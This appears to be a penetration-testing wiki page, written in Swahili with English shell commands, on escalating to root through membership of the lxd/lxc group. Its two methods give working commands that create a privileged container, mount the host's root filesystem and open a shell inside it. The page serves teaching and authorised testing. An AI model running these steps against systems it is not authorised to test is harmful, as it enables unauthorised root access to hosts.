# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Uanachama katika management group ya LXD ya host (kwa kawaida _**lxd**_) unaweza kutoa njia ya kupata root kwa kuruhusu udhibiti kamili wa daemon.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Method 1

Unaweza kupakua image ya Alpine ya kutumia na LXD kutoka kwenye repository inayoaminika.  
Canonical's LXD image server huchapisha builds za kila siku: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Pakua tu **lxd.tar.xz** na **rootfs.squashfs** kutoka kwenye build mpya zaidi (jina la directory ni tarehe).<sup>[[8]](#references)</sup>

Vinginevyo, unaweza kusakinisha distrobuilder kwenye mashine yako kwa kufuata [maelekezo ya project](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Pakia **incus.tar.xz** (**lxd.tar.xz** ikiwa umeipakua kutoka kwa Canonical image server) na **rootfs.squashfs**, kisha import image na uunde container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Ukipata hitilafu hii _**Error: No storage pool found. Please create a new storage pool**_\
> Endesha **`lxd init`**, sanidi default storage pool, kisha **rudia** sehemu ya awali ya amri.<sup>[[2]](#references)</sup>

Hatimaye, anza container na ufungue root shell kwenye host filesystem:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Jenga image ya Alpine na ianzishe kwa flag `security.privileged=true`, ambayo hu-map container root kuwa host root; kuweka `/` kama mount kisha huonyesha filesystem ya host ndani ya container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Jinsi ya kuimarisha usalama wa LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Containers na virtual machines za LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Jinsi ya kunakili na kuingiza images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Jinsi ya kuunda images kwa kutumia distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Ufafanuzi wa Alpine image](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script ya ujenzi ya lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
